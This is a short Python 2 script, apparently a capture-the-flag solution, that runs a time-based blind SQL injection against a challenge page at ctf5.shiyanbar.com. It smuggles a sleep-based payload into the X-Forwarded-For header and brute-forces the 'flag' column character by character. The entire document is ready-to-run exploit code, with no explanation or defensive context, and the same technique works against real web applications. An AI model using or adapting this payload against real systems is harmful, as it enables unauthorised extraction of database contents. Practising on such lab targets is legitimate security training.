#!/usr/bin/python

import requests
import time
payloads='abcdefghijklmnopqrstuvwxyz0123456789@_.{}-'
flag = ''
def exp(x,i):
    starttime=time.time()
    url = "http://ctf5.shiyanbar.com/web/wonderkun/index.php"
    xxx = "' or sleep(ascii(mid((select(flag)from(flag))from("+str(x)+")for(1)))=ascii('"+i+"')) and '1'='1"
    headers = {
    "Host": "ctf5.shiyanbar.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "X-FORWARDED-FOR": xxx
    }
    res = requests.get(url, headers=headers)
    s = time.time() - starttime;
    if s > 1:
        return 1
    else:
        return 0
for x in range(1,33):
    for i in payloads:
        if (exp(x,i)):
            flag+=i
            print flag
            break
        else:
            pass
print 'flag:'+flag
